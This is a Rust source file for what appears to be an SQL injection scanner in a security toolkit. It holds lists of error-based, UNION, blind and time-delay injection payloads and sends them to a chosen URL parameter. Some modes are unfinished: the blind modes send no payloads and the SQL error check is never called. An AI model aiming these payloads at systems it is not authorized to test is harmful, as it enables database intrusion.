// yxpil · NETON
//! SQL 注入测试工具
//! 基本注入检测、Union 注入、布尔盲注

use serde::{Deserialize, Serialize};
use std::time::Duration;

/// SQL 注入检测类型
#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum InjectionType {
    /// 基础错误注入检测
    BasicError,
    /// Union 查询注入
    UnionBased,
    /// 布尔盲注
    BooleanBlind,
    /// 时间盲注
    TimeBasedBlind,
    /// 全面检测
    FullScan,
}

/// SQL 注入测试配置
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SqlInjectionConfig {
    /// 目标 URL
    pub url: String,
    /// 测试参数名
    pub param: String,
    /// 请求方法
    pub method: String,
    /// 注入类型
    pub injection_type: InjectionType,
    /// 请求超时（毫秒）
    pub timeout_ms: u64,
    /// 自定义 Cookie
    pub cookies: Option<String>,
    /// 自定义请求头
    pub headers: Option<std::collections::HashMap<String, String>>,
}

impl Default for SqlInjectionConfig {
    fn default() -> Self {
        Self {
            url: "http://example.com/page".to_string(),
            param: "id".to_string(),
            method: "GET".to_string(),
            injection_type: InjectionType::BasicError,
            timeout_ms: 5000,
            cookies: None,
            headers: None,
        }
    }
}

/// 注入测试结果
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct InjectionTestResult {
    pub param: String,
    pub payload: String,
    pub is_vulnerable: bool,
    pub evidence: String,
    pub response_time_ms: u64,
    pub response_status: u16,
    pub response_length: usize,
}

/// SQL 注入扫描结果
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SqlInjectionResult {
    pub target_url: String,
    pub test_type: String,
    pub total_tests: u32,
    pub vulnerable_params: Vec<InjectionTestResult>,
    pub safe_params: u32,
    pub duration_ms: u64,
}

/// SQL 注入 Payload 列表
fn get_basic_error_payloads() -> Vec<&'static str> {
    vec![
        "'",
        "\"",
        "' OR '1'='1",
        "\" OR \"1\"=\"1",
        "' OR 1=1--",
        "\" OR 1=1--",
        "') OR ('1'='1",
        "' UNION SELECT NULL--",
        "' AND 1=CONVERT(int, (SELECT @@version))--",
        "1 AND 1=1",
        "1 AND 1=2",
    ]
}

fn get_union_payloads() -> Vec<&'static str> {
    vec![
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL, NULL--",
        "' UNION SELECT NULL, NULL, NULL--",
        "' UNION SELECT NULL, NULL, NULL, NULL--",
        "' UNION SELECT NULL, NULL, NULL, NULL, NULL--",
        "' UNION SELECT 1,2,3--",
        "' UNION SELECT 1,2,3,4--",
        "' UNION SELECT 1,2,3,4,5--",
        "' UNION SELECT @@version, NULL, NULL--",
        "' UNION SELECT user(), NULL, NULL--",
        "' UNION SELECT table_name, NULL FROM information_schema.tables--",
    ]
}

fn get_boolean_blind_payloads() -> Vec<(&'static str, bool)> {
    vec![
        ("' AND 1=1--", true),
        ("' AND 1=2--", false),
        ("' AND SLEEP(0)--", true),
        ("' AND SLEEP(5)--", true),
        ("1 AND (SELECT COUNT(*) FROM users) > 0--", true),
        ("1 AND ASCII(SUBSTRING((SELECT user()),1,1)) > 64--", true),
    ]
}

fn get_time_based_payloads() -> Vec<&'static str> {
    vec![
        "' AND SLEEP(5)--",
        "1 AND SLEEP(5)--",
        "'; WAITFOR DELAY '0:0:5'--",
        "1; SELECT pg_sleep(5)--",
        "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
    ]
}

/// 发送 HTTP 请求并获取响应信息
async fn send_request(
    url: &str,
    param: &str,
    payload: &str,
    method: &str,
    timeout_ms: u64,
    cookies: Option<&str>,
    _headers: Option<&std::collections::HashMap<String, String>>,
) -> Result<(u16, usize, u64), String> {
    let client = reqwest::Client::builder()
        .timeout(Duration::from_millis(timeout_ms))
        .redirect(reqwest::redirect::Policy::none())
        .build()
        .map_err(|e| e.to_string())?;

    let start = std::time::Instant::now();

    let request = match method.to_uppercase().as_str() {
        "GET" => {
            let separator = if url.contains('?') { "&" } else { "?" };
            let full_url = format!("{}{}{}={}", url, separator, param, urlencoding::encode(payload));
            let mut req = client.get(&full_url);
            if let Some(cookie) = cookies {
                req = req.header(reqwest::header::COOKIE, cookie);
            }
            req
        }
        "POST" => {
            let mut req = client.post(url);
            let mut form = std::collections::HashMap::new();
            form.insert(param, payload);
            req = req.form(&form);
            if let Some(cookie) = cookies {
                req = req.header(reqwest::header::COOKIE, cookie);
            }
            req
        }
        _ => return Err(format!("不支持的请求方法: {}", method)),
    };

    let response = request.send().await.map_err(|e| e.to_string())?;
    let status = response.status().as_u16();
    let body = response.text().await.unwrap_or_default();
    let length = body.len();
    let response_time = start.elapsed().as_millis() as u64;

    Ok((status, length, response_time))
}

/// 检测响应中是否包含 SQL 错误信息
fn has_sql_error(body: &str) -> bool {
    let error_patterns = [
        "SQL syntax",
        "mysql_fetch",
        "ORA-",
        "PostgreSQL",
        "syntax error",
        "unclosed quotation mark",
        "SQLSTATE",
        "Microsoft OLE DB Provider",
        "SQL Server",
        "Warning: mysql_",
        "You have an error in your SQL syntax",
        "supplied argument is not a valid MySQL",
        "pg_query()",
        "SQLite3::",
        "OperationalError",
        "ProgrammingError",
        "IntegrityError",
    ];

    let body_upper = body.to_uppercase();
    error_patterns
        .iter()
        .any(|p| body_upper.contains(&p.to_uppercase()))
}

/// 执行 SQL 注入测试
pub async fn test_sql_injection(config: SqlInjectionConfig) -> Result<String, String> {
    let start_time = std::time::Instant::now();
    let mut vulnerable_params = Vec::new();
    let mut safe_count = 0u32;
    let mut total_tests = 0u32;

    let payloads: Vec<&str> = match config.injection_type {
        InjectionType::BasicError => get_basic_error_payloads(),
        InjectionType::UnionBased => get_union_payloads(),
        InjectionType::BooleanBlind | InjectionType::TimeBasedBlind => {
            vec![] // 这些需要特殊处理
        }
        InjectionType::FullScan => {
            let mut all = get_basic_error_payloads();
            all.extend(get_union_payloads());
            all.extend(get_time_based_payloads());
            all
        }
    };

    // 获取基准响应
    let (base_status, base_length, base_time) = send_request(
        &config.url,
        &config.param,
        "1",
        &config.method,
        config.timeout_ms,
        config.cookies.as_deref(),
        config.headers.as_ref(),
    )
    .await
    .unwrap_or((200, 0, 0));

    for payload in payloads {
        total_tests += 1;

        let result = send_request(
            &config.url,
            &config.param,
            payload,
            &config.method,
            config.timeout_ms,
            config.cookies.as_deref(),
            config.headers.as_ref(),
        )
        .await;

        match result {
            Ok((status, length, response_time)) => {
                let mut is_vulnerable = false;
                let mut evidence = String::new();

                // 错误注入检测
                if matches!(config.injection_type, InjectionType::BasicError | InjectionType::FullScan) {
                    // 检查状态码变化
                    if status != base_status && status >= 500 {
                        is_vulnerable = true;
                        evidence = format!("服务器返回错误状态码: {}", status);
                    }
                    // 检查响应长度显著变化
                    if (length as i64 - base_length as i64).abs() > (base_length as f64 * 0.5) as i64
                        && length > 0
                    {
                        is_vulnerable = true;
                        evidence = format!(
                            "响应长度显著变化: {} -> {} (基准: {})",
                            base_length, length, base_length
                        );
                    }
                }

                // 时间盲注检测
                if matches!(
                    config.injection_type,
                    InjectionType::TimeBasedBlind | InjectionType::FullScan
                ) {
                    if response_time > base_time + 3000 {
                        is_vulnerable = true;
                        evidence = format!(
                            "响应时间显著增加: {}ms (基准: {}ms)",
                            response_time, base_time
                        );
                    }
                }

                let test_result = InjectionTestResult {
                    param: config.param.clone(),
                    payload: payload.to_string(),
                    is_vulnerable,
                    evidence,
                    response_time_ms: response_time,
                    response_status: status,
                    response_length: length,
                };

                if is_vulnerable {
                    vulnerable_params.push(test_result);
                } else {
                    safe_count += 1;
                }
            }
            Err(e) => {
                safe_count += 1;
                eprintln!("请求失败: {}", e);
            }
        }
    }

    let test_type = match config.injection_type {
        InjectionType::BasicError => "基础错误注入",
        InjectionType::UnionBased => "Union 注入",
        InjectionType::BooleanBlind => "布尔盲注",
        InjectionType::TimeBasedBlind => "时间盲注",
        InjectionType::FullScan => "全面检测",
    }
    .to_string();

    let result = SqlInjectionResult {
        target_url: config.url,
        test_type,
        total_tests,
        vulnerable_params,
        safe_params: safe_count,
        duration_ms: start_time.elapsed().as_millis() as u64,
    };

    serde_json::to_string(&crate::netsec::ToolResult::ok(result, "SQL 注入测试完成"))
        .map_err(|e| format!("序列化失败: {}", e))
}

/// 快速检测 URL 是否存在 SQL 注入漏洞
pub async fn quick_sqli_check(url: String, param: String) -> Result<String, String> {
    let config = SqlInjectionConfig {
        url,
        param,
        method: "GET".to_string(),
        injection_type: InjectionType::BasicError,
        timeout_ms: 5000,
        cookies: None,
        headers: None,
    };

    test_sql_injection(config).await
}
